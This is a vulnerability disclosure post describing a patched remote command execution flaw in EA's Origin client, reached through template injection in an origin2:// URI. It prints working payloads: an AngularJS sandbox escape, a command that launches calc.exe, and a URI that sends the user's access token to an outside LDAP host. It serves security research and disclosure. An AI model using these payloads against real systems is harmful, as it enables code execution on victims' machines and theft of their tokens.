---
layout: post
title: "RCE in EA's Origin client"
date: 2019-04-16
author: Admin
img: post01.jpg
thumb: thumb01.jpg
---

Hello, and welcome! As you probably gathered by the title, today we will be going over a remote command execution vulnerability identified in EA's Origin desktop client. This issue was both identified and reported by Dominik Penner and Daley Bee of Underdog Security.

### What is Origin?
Origin is an online gaming, digital distribution and digital rights management platform developed by Electronic Arts that allows users to purchase games for PC and mobile platforms. Origin is home to gaming title giants such as Apex Legends, The Sims, and Battlefield. 
### What did we find?
We located a client-sided template injection, where we proceeded to use an AngularJS sandbox escape and achieve RCE by communicating with QtApplication's QDesktopServices.
### Technical explanation
We were simply curious and looking around at the `origin2` URI handler, when we came across a parameter where we could supply data that would be echoed back to us in the Origin client, prompting us to start tinkering. 

Example: 
{% highlight ruby %}
{% raw %}
origin2://game/launch?offerIds=0&title=example
{% endraw %}
{% endhighlight %}

![example title](/assets/origin_orce/example_title.jpg)

After some quick testing, we learnt that there was a client-sided template injection in the `title` parameter. 

{% highlight ruby %}
{% raw %}
origin2://game/launch?offerIds=0&title={{668.5*2}}
{% endraw %}
{% endhighlight %}

![1337 template injection](/assets/origin_orce/template_injection.jpg)

What next!? We already knew due to prior tinkering that Origin ran on AngularJS. Thanks to amazing work by other researchers in the past, with a simple Google search, we can find plenty of working AngularJS sandbox escapes. We used these: [link to payloads](https://gist.github.com/mccabe615/cc92daaf368c9f5e15eda371728083a3)

With these payloads, we were able to escape the AngularJS sandbox using the template injection. This is the payload we used: 

{% highlight ruby %}
{% raw %}
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(l),a')}}
{% endraw %}
{% endhighlight %}

The entire payload ended up becoming: 

{% highlight ruby %}
{% raw %}
origin2://game/launch?offerIds=0&title={{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
{% endraw %}
{% endhighlight %}

![sandbox escape](/assets/origin_orce/sandbox_escape.jpg)

We then learnt that by leveraging the in-client API, you can communicate with the QtApplication's QDesktopServices. 

To pop a calculator, we used the following payload:

{% highlight ruby %}
{% raw %}
origin2://game/launch?offerIds=0&title={{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,Origin.client.desktopServices.asyncOpenUrl("calc.exe"),a')}}
{% endraw %}
{% endhighlight %}

As normal with an RCE, this would've allowed an attacker to execute any kind of commands their heart desired on a targets machine. Not good to say the least...

An attacker could also steal a users access token many of ways, for example, through LDAP: 

{% highlight ruby %}
{% raw %}
origin2://game/launch?offerIds=0&title={{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,Origin.client.desktopServices.asyncOpenUrl("ldap://safe.tld/o="+Origin.user.accessToken()+",c=UnderDog"),a')}}
{% endraw %}
{% endhighlight %}

Moral to the story Origin; sanitize your inputs!

Thank you for reading!

----
### Disclosure timeline
* April 15, 2019 - Vulnerability identified
* April 16, 2019 - Vulnerability reported
* April 16, 2019 - Vulnerability patched
* April 16, 2019 - Public disclosure

* Dominik Penner - [Twitter](https://twitter.com/zer0pwn)
* Daley Bee - [Twitter](https://twitter.com/daley)
